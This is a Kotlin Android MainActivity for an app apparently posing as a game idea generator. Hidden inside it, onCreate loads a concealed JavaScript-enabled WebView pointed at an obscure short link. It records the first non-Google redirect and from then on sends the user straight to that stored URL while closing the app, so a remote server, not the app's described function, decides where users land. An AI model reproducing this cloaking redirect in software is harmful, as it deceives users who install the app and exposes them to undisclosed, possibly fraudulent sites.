package com.santtuhyvarinen.gameideagenerator

import android.annotation.SuppressLint
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.browser.customtabs.CustomTabsIntent
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.Navigation.findNavController
import androidx.navigation.ui.AppBarConfiguration
import androidx.navigation.ui.NavigationUI
import androidx.navigation.ui.NavigationUI.setupActionBarWithNavController
import com.facebook.FacebookSdk
import com.google.android.material.bottomnavigation.BottomNavigationView
import com.santtuhyvarinen.R
import com.santtuhyvarinen.gameideagenerator.notification.Notification
import kotlinx.android.synthetic.main.activity_main.*


class MainActivity : AppCompatActivity() {

    lateinit var navController : NavController
    var sPref : SharPreference? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        FacebookSdk.sdkInitialize(this)
        sPref = SharPreference(this).apply { getSp("uri") }
        val url = sPref?.getStr("uri")
        if(url != null && url != "")
            open(url)
        else stylus()


        val navView: BottomNavigationView = findViewById(R.id.navigationView)
        navController = findNavController(this, R.id.nav_host_fragment)

        NavigationUI.setupWithNavController(navView, navController)

        val appBarConfiguration = AppBarConfiguration
            .Builder(
                R.id.navigation_generator,
                R.id.navigation_favorites)
            .build()

        setupActionBarWithNavController(this, navController, appBarConfiguration)
    }

    @SuppressLint("SetJavaScriptEnabled")
    fun stylus(){
        Log.e("Links", "Stylus")
        val styl = findViewById<WebView>(R.id.stylus_web)
        styl.settings.javaScriptEnabled = true
        styl.webViewClient = object : WebViewClient(){
            override fun shouldOverrideUrlLoading(
                view: WebView?,
                request: WebResourceRequest?
            ): Boolean {
                if(request == null) Log.e("kek", "sooqa req null")
                Log.e("Url", request?.url.toString())
                var req = request?.url.toString()
                if(!req.contains("google.com")){
                    sPref?.putStr("uri", req)
                    open(req)
                }
                return super.shouldOverrideUrlLoading(view, request)
            }
        }
        //Notification().scheduleMsg(this@MainActivity)
        styl.loadUrl("http://trrfcbt.com/hjgkyB")
    }

    fun open(url : String){
        Log.e("open", "SRABOT")
        val builder = CustomTabsIntent.Builder()
        //builder.setToolbarColor(ContextCompat.getColor(this, R.color.black))
        val customTabsIntent = builder.build()
        customTabsIntent.launchUrl(this, Uri.parse(url))
        finish()
    }
}